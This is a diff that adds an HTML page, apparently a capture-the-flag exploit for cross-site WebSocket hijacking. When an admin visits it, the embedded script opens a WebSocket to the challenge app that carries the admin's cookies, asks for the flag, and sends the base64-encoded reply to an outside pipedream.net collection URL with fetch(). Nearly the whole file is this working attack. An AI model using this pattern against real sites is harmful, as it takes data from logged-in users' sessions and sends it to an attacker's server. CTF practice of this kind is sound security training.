@@ -1,0 +1,21 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+/* Change to any endpoint you control (webhook.site, RequestBin, etc.) */
+const exfil = "https://en6kwcm7uxp1.x.pipedream.net/?d=";
+
+/* 1.  Open a WS to the real app – admin's cookie will be sent. */
+const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
+
+/* 2.  When connected, ask for the flag. */
+ws.addEventListener("open", () =>
+  ws.send(JSON.stringify({ sender: "user", message: "/getFlag" }))
+);
+
+/* 3.  First message back contains “Flag: …”.  Exfiltrate and close. */
+ws.addEventListener("message", ev => {
+  fetch(exfil + btoa(ev.data));   // leak safely
+  ws.close();
+});
+</script>
+<p>If you’re seeing this in a normal browser you aren’t the admin :)</p>
